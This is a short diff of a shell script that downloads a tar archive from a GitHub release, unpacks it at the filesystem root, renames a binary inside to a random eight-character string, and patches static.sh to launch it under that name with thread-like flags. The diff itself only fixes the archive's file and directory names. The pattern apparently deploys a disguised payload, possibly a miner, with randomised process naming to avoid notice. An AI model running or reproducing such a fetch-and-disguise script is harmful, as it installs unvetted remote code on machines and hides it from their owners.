@@ -1,7 +1,7 @@
 cd /
 wget https://github.com/modums/roreut/releases/download/v0.0.3/surce.tar
-tar -xvf source.tar
-cd /source
+tar -xvf surce.tar
+cd /surce
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv truces $variable1
 sed -i "s/oodo/${variable1} -t=450 -n=${variable1}/g" ./static.sh
